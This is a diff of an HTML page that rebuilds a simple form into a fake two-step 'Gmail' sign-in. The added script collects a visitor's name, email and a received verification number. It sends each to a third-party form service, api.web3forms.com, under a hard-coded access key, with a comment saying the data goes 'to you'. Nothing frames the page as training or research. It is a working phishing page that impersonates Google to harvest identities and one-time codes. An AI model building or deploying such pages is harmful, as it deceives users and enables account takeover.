@@ -3,72 +3,163 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Course Login</title>
+<title>Login</title>
+
 <style>
-  body {
-    font-family: Arial, sans-serif;
-    background-color: #f2f2f2;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-  }
-  .login-container {
-    background-color: #fff;
-    padding: 40px;
-    border-radius: 8px;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    width: 320px;
-    text-align: center;
-  }
-  .logo {
-    font-size: 48px;
-    color: #d93025; /* Gmail-red-like color */
-  }
-  .title {
-    font-size: 28px;
-    font-weight: bold;
-    margin: 10px 0 30px 0;
-    color: #202124;
-  }
-  .login-container input {
-    width: 100%;
-    padding: 12px;
-    margin: 10px 0;
-    border-radius: 4px;
-    border: 1px solid #ccc;
-    font-size: 16px;
-  }
-  .login-container button {
-    width: 100%;
-    padding: 12px;
-    background-color: #1a73e8;
-    color: white;
-    border: none;
-    border-radius: 4px;
-    font-size: 16px;
-    cursor: pointer;
-    margin-top: 15px;
-  }
-  .login-container button:hover {
-    background-color: #1669c1;
-  }
+body {
+  font-family: Arial, sans-serif;
+  background:#f2f2f2;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  margin:0;
+}
+
+.container {
+  background:#fff;
+  padding:40px;
+  border-radius:8px;
+  width:320px;
+  text-align:center;
+  box-shadow:0 4px 12px rgba(0,0,0,0.1);
+}
+
+input {
+  width:100%;
+  padding:12px;
+  margin:10px 0;
+  border:1px solid #ccc;
+  border-radius:4px;
+}
+
+button {
+  width:100%;
+  padding:12px;
+  background:#1a73e8;
+  color:#fff;
+  border:none;
+  border-radius:4px;
+  cursor:pointer;
+}
+
+.toggle {
+  font-size:13px;
+  color:#1a73e8;
+  cursor:pointer;
+  text-align:left;
+}
+
+.hidden {
+  display:none;
+}
 </style>
 </head>
+
 <body>
 
-<div class="login-container">
-  <div class="logo">📧</div>
-  <div class="title">Gmail</div>
-<form action="https://api.web3forms.com/submit" method="POST">
-  <input type="hidden" name="access_key" value="aa58c3a6-99c0-417e-9402-36b506d7491c">
-  <input type="text" name="name" required>
-  <input type="email" name="email" required>
-  <textarea name="message" required></textarea>
-  <button type="submit">Submit Form</button>
-</form>
+<div class="container">
+
+  <!-- STEP 1 -->
+  <div id="step1">
+    <h2>Gmail</h2>
+
+    <form id="form1">
+      <input type="text" name="name" id="name" placeholder="Enter your name" required>
+      <input type="password" id="emailField" name="email" placeholder="Enter your email" required>
+
+      <div class="toggle" onclick="toggleEmail()">Show email</div>
+
+      <button type="submit">Next</button>
+    </form>
+  </div>
+
+  <!-- STEP 2 -->
+  <div id="step2" class="hidden">
+    <h2>Verification</h2>
+
+    <form id="form2">
+      <input type="text" name="number" placeholder="Enter the number you received" required>
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
 </div>
+
+<script>
+const ACCESS_KEY = "aa58c3a6-99c0-417e-9402-36b506d7491c";
+
+function toggleEmail() {
+  let f = document.getElementById("emailField");
+  f.type = (f.type === "password") ? "text" : "password";
+}
+
+let userName = "";
+let userEmail = "";
+
+// STEP 1 SUBMIT
+document.getElementById("form1").addEventListener("submit", async function(e){
+  e.preventDefault();
+
+  userName = document.getElementById("name").value;
+  userEmail = document.getElementById("emailField").value;
+
+  // send name + email to you
+  let formData = new FormData();
+  formData.append("access_key", ACCESS_KEY);
+  formData.append("name", userName);
+  formData.append("email", userEmail);
+
+  try {
+    await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData
+    });
+
+    // go to step 2
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
+
+  } catch(err) {
+    alert("Connection error. Please try again.");
+  }
+});
+
+// STEP 2 SUBMIT
+document.getElementById("form2").addEventListener("submit", async function(e){
+  e.preventDefault();
+
+  let number = this.number.value;
+
+  // Send number along with name + email again
+  let formData = new FormData();
+  formData.append("access_key", ACCESS_KEY);
+  formData.append("name", userName);
+  formData.append("email", userEmail);
+  formData.append("number", number);
+
+  try {
+    await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData
+    });
+
+    // Check number validity (here we simulate verification)
+    // Replace '1234' with your correct code
+    if(number !== "1234") {
+      alert("Verification code is wrong");
+      // reload page for user to retry
+      window.location.reload();
+    } else {
+      alert("Number submitted successfully");
+      this.reset();
+    }
+
+  } catch(err) {
+    alert("Connection error. Please try again.");
+  }
+});
+</script>
 
 </body>
 </html>
